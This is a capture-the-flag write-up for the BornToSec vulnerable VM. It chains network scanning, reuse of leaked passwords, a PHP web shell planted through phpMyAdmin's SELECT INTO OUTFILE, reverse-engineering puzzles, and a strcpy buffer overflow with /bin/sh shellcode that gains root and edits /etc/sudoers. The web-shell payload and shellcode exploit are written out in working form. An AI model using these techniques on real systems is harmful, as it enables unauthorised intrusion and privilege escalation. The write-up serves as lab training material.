# BornToSec — Write-up

## Finding the VM IP Address

We have the VM, and we need to find its IP address.

We run `ifconfig` on our computer and find:

```text
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
```

```text
inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
```

```text
inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
```

This is our VirtualBox network, so we run Nmap to see which services are running on it:

```bash
nmap 192.168.56.0-255
```

We find:

```text
Nmap scan report for 192.168.56.108
```

```text
Host is up (0.00019s latency).
```

```text
Not shown: 994 closed tcp ports (conn-refused)
```

```text
PORT    STATE SERVICE
```

```text
21/tcp  open  ftp
```

```text
22/tcp  open  ssh
```

```text
80/tcp  open  http
```

```text
143/tcp open  imap
```

```text
443/tcp open  https
```

```text
993/tcp open  imaps
```

## Web Enumeration

We can see that port 80 is open, so a web service is running.

git clone https://github.com/maurosoria/dirsearch.git

We can use `dirsearch` to enumerate potential paths at `192.168.56.108`.

```bash
python dirsearch.py -u https://192.168.56.108
```

```text
[16:04:29] Scanning:
```

```text
[16:04:36] 403 -   291B - /cgi-bin/
```

```text
[16:04:38] 301 -   318B - /forum  ->  https://192.168.56.108/forum/
```

```text
[16:04:38] 200 -    5KB - /forum/
```

```text
[16:04:42] 301 -   323B - /phpmyadmin  ->  https://192.168.56.108/phpmyadmin/
```

```text
[16:04:42] 200 -    7KB - /phpmyadmin/
```

```text
[16:04:42] 200 -    7KB - /phpmyadmin/index.php
```

```text
[16:04:44] 403 -   297B - /server-status/
```

```text
[16:04:44] 403 -   296B - /server-status
```

```text
[16:04:46] 301 -   320B - /webmail  ->  https://192.168.56.108/webmail/
```

```text
[16:04:46] 403 -   309B - /webmail/src/configtest.php
```

## Forum and Webmail

We have three usable paths: `/forum/`, `/phpmyadmin/`, and `/webmail/`.

We start with https://192.168.56.108/forum/.

We find a topic called "Probleme login ?" created by `lmezard`.

It seems to contain SSH connection logs. While browsing them, we find this line:

```text
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

We can guess that `lmezard` entered the password instead of the username. We try this password to log in to the forum:

**Username:** lmezard

**Password:** !q\]Ej?*5K5cy*AJ

We are logged in to the forum.

On `lmezard`'s profile page, we find the email address: `laurie@borntosec.net`.

We can try to log in to the webmail.

**Name:** laurie@borntosec.net

**Password:** !q\]Ej?*5K5cy*AJ

We find an email with the subject "DB access".

the login for DB is :

**Username:** root

**Password:** Fg-'kKXBj87E:aJ$

## Database Access

Now we can go on https://192.168.56.108/phpmyadmin/

we look for the directory where we can create a file that will be a page with dirsearch

python dirsearch.py -u https://192.168.56.108/forum/ 

we find : [12:35:51] 200 -    5KB - /forum/templates_c/

we know that the site is using apache so the pages are in /var/www/forum/

we run the SQL command : SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"

This creates `exploit.php`, which executes the command provided through the `cmd` parameter.

Now we can browse the server's directories.

so we make :

`https://192.168.56.101/forum/templates_c/exploit.php?cmd=ls%20/home`

And find:

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

We go to `LOOKATME`.

`https://192.168.56.108/forum/templates_c/exploit.php?cmd=ls%20/home/LOOKATME`

We find:

password

We want to read this file:

`https://192.168.56.108/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password`

And we finally find:

lmezard:G!@M6f4Eatau{sF"

## FTP Access

We try to login on the ftp service that runs on port 21

```bash
ftp 192.168.56.108
```

**username:** lmezard

**password:** G!@M6f4Eatau{sF"

```bash
ftp>ls
```

We find: `README` and `fun`.

```bash
ftp>get README
```

```bash
ftp>get fun
```

cat README :

Complete this little challenge and use the result as password for user 'laurie' to login in ssh

```bash
file fun
```

fun: POSIX tar archive (GNU)

## Solving the `fun` Challenge

We can see that `fun` is a tar archive.

We extract it:

```bash
tar -xf fun
```

We obtain the `ft_fun` folder.

We find 750 files inside it.

I print all the files with:

```bash
cat *
```

And I find a `main()` function:

```c
int main() {

printf("M");

printf("Y");

printf(" ");

printf("P");

printf("A");

printf("S");

printf("S");

printf("W");

printf("O");

printf("R");

printf("D");

printf(" ");

printf("I");

printf("S");

printf(":");

printf(" ");

printf("%c",getme1());

printf("%c",getme2());

printf("%c",getme3());

printf("%c",getme4());

printf("%c",getme5());

printf("%c",getme6());

printf("%c",getme7());

printf("%c",getme8());

printf("%c",getme9());

printf("%c",getme10());

printf("%c",getme11());

printf("%c",getme12());

printf("\n");

printf("
```

Now SHA-256 it and submit");

}

Now we just need to find all the `getme*` functions.

I copy the output of `cat` into VS Code and use Ctrl+F to find `getme*`.

With this method, we find:

```c
char getme8() {

return 'w';

}

char getme9() {

return 'n';

}

char getme10() {

return 'a';

}

char getme11() {

return 'g';

}

char getme12()

{

return 'e';

}

Many `getme()` functions are split across files, but we have file numbers at the end of each file, so we can find them easily.

char getme1()

{

return 'I';

}

char getme7()

{

return 'p';

}

char getme4()

{

return 'a';

}

char getme5()

{

return 'r';

}

char getme6()

{

return 't';

}

char getme3()

{

return 'e';

}

char getme2()

{

return 'h';

}
```

So we get:

MY PASSWORD IS : Iheartpwnage

Now SHA-256 it and submit

We hash `Iheartpwnage` with SHA-256 and obtain:

330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

## Connecting as Laurie

We can now try connecting to `laurie@192.168.56.108` via SSH using this password.

We are finally connected.

We have two files: `bomb` and `README`.

We read the `README` and get:

Diffuse this bomb!

When you have all the password use it as "thor" user with ssh.

HINT:

P

2

b

o

4

NO SPACE IN THE PASSWORD (password is case sensitive).

## Solving the Bomb

we download the bomb :

```bash
scp -P 22 laurie@192.168.56.108:/home/laurie/bomb .
```

We upload it to Dogbolt and see that there are six phases.

the first phase is just waiting for the string : "Public speaking is very easy."

For phase 2, I reproduce the logic in C and get:

```bash
1 2 6 24 120 720
```

For phase 3, we only need to match one case:

```bash
1 b 214
```

For phase 4, I wrote another script that reproduces the bomb's behavior and found:

```bash
9
```

For phase 5, I decompiled the file with Kuna and found a substitution table at address `0x804b220`.

I open `bomb` with GDB and inspect the address using `x/s 0x804b220`.

And I find: `isrveawhobpnutfg`.

we find this line :
```bash
local_c[iVar1] = (&array_123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
```
we know that array_123 is equal to isrveawhobpnutfg

we take for exmple the charactere 'a' : 97 in ASCII

so it turns to 0001 with the operation & 0xf because
0xf = 0000 1111

it take the four first bits

97 = 01100001

01100001 & 0xf = 0001

so it gives "isrveawhobpnutfg"[1]

si 'a' becomes 's'

is we want to pass this phase we have to find a entry that will be transformed un the word 'giants'

after little bit of searching we find :
```bash
opekmq
```

For phase 6, we can see in Binary Ninja that the program expects six values and checks for a specific

order of these numbers. I brute-force the phase with this script:

```python

cat > test.py <<'PY'
# -*- coding: utf-8 -*-

import itertools
import subprocess

phases = [
    "Public speaking is very easy.",
    "1 2 6 24 120 720",
    "0 q 777",
    "9",
    "opekmq"
]

for perm in itertools.permutations(range(1, 7)):
    phase6 = " ".join(map(str, perm))
    stdin_data = "\n".join(phases + [phase6]) + "\n"

    print("Test : " + phase6)

    process = subprocess.Popen(
        ["/home/laurie/bomb"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    stdout, stderr = process.communicate(
        stdin_data.encode("utf-8")
    )

    output = stdout.decode("utf-8", errors="replace")

    if process.returncode == 0 and "BOOM" not in output:
        print("====================")
        print("TROUVE : " + phase6)
        print("====================")
        print(output)
        break
else:
    print("Aucune permutation valide trouvée.")
PY

```bash
```

4 2 6 3 1 5
```

The SSH password for `thor` is a concatenation of all the phase results: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

## Thor and the Turtle Challenge

We connect as `thor` and find a file named `turtle` with instructions such as:

Tourne droite de 1 degrees

Avance 1 spaces

Tourne droite de 1 degrees

Avance 1 spaces

And a README says that the resulting password is `zaz`'s password.

We use Python's `turtle` library to translate the instructions into code.

We retrieve the file on our machine with:

```bash
scp -P 22 thor@192.168.56.108:/home/thor/turtle .
```

We rename it `instructions` and find the word `SLASH` drawn with the `turtle` library.

The digest hint points to MD5, so we hash `SLASH`.

We find: `646da671ca01bb5d84dbb5fb2238dc8e`.

This is `zaz`'s password.

## Connecting as Zaz

We connect to zaz

We find an executable file: `exploit_me`.

## Analyzing `exploit_me`

We disassemble it with Binary Ninja and find:

```bash
strcpy(&str, argv[1]);
```

An unprotected `strcpy`, which allows a buffer overflow that can overwrite the EIP register and redirect execution

to shellcode placed in the environment.

### Finding the Offset

First, we search for the offset.

we run :

```bash
(gdb) r $(python -c 'print "a" * 143')
```

We find an offset of 140.

### Finding the Shellcode Address

We search for the address of the shellcode placed in the environment.

```bash
env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb ./exploit_me
```

```bash
(gdb) b main
```

```bash
(gdb) r
```

```bash
(gdb) x/500s environ
```

20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...

0xbffffe63:  "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220

We can use `0xbffffe63`.

### Running the Exploit

We now have everything we need for the exploit.

```bash
env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
./exploit_me $(python -c 'print "\x90" * 140 + "\x63\xfe\xff\xbf"')
```

## Root Access

We now have a root shell, so we can add `zaz` to the sudoers file.

```bash
chmod 666 /etc/sudoers
```

We add `zaz`:

root    ALL=(ALL:ALL) ALL

zaz     ALL=(ALL:ALL) ALL

```bash
chmod 440 /etc/sudoers
```

```bash
sudo su
```

We are root!
